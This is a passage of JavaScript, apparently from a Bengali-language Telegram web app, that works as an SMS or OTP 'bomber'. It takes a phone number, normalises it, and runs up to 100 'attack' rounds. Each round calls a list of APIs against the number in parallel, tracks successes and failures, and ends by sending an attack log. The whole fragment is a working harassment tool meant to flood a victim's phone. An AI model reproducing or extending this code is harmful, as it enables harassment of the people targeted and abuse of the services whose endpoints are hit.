        return;
    }
    if (amount > 100) {
        if (tg) tg.showAlert('⚠️ সর্বোচ্চ ১০০ রাউন্ড পর্যন্ত দেওয়া যাবে!');
        else alert('⚠️ সর্বোচ্চ ১০০ রাউন্ড পর্যন্ত দেওয়া যাবে!');
        document.getElementById("amount").value = 100;
        amount = 100;
    }

    const rate = checkRateLimit();
    if (!rate.allowed) {
        document.getElementById('rateLimitTitle').textContent = '⏳ আরও ' + rate.remaining + ' মিনিট অপেক্ষা করুন!';
        document.getElementById('rateLimitSub').textContent = 'আপনি ইতিমধ্যে ১০০ রাউন্ড অ্যাটাক করেছেন। ১ ঘন্টা পর আবার চেষ্টা করুন।';
        document.getElementById('rateLimitPopup').classList.add('active');
        return;
    }

    number = number.replace(/\s+/g, "");
    if (!number.startsWith("0")) number = "0" + number;

    const btn = document.getElementById("sendBtn");
    btn.disabled = true;
    isAttacking = true;
    document.getElementById("btnText").textContent = "ATTACKING...";
    document.getElementById("progressSection").style.display = "block";

    let success = 0, failed = 0;

    for (let round = 0; round < amount; round++) {
        const results = await Promise.all(APIS.map(api => callAPI(api, number)));
        results.forEach(r => r ? success++ : failed++);

        const totalCalls = (round + 1) * APIS.length;
        const pct = ((round + 1) / amount * 100).toFixed(0);

        document.getElementById("progressFill").style.width = pct + "%";
        document.getElementById("progressPercent").textContent = pct + "%";
        document.getElementById("successCount").textContent = success;
        document.getElementById("failCount").textContent = failed;
        document.getElementById("totalCount").textContent = totalCalls;

        if (round < amount - 1) await new Promise(r => setTimeout(r, 500));
    }

    btn.disabled = false;
    isAttacking = false;
    document.getElementById("btnText").textContent = "START ATTACK";

    document.getElementById('popupSuccess').textContent = success;
    document.getElementById('popupFailed').textContent = failed;
    document.getElementById('successPopup').classList.add('active');

    saveAttackTime();
    checkAndShowRateLimit();

    await sendAttackLog(number, amount, success, failed);
}

